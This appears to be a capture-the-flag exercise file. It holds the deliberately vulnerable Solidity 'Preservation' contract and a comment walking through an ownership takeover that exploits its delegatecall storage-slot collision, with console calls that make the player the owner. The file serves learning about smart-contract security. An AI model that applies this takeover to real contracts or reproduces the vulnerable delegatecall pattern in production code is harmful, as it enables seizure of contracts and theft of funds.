// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/* 
    how the exploit work :
        delegatecall runs library code in the context of the main contract
        The setTime() function writes to slot 0
        In Preservation, slot 0 = timeZone1Library, slot 2 = owner

    We deploy our Attack contract and setFirstTime with the address of that smart contract,
    await contract.setFirstTime("0x480c518644f5612586dA334D52b4107D9994d10a")

    then we become the owner :
    await contract.setFirstTime(player)

    to check if the we succeed : 
    (await contract.owner()) === player

*/

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}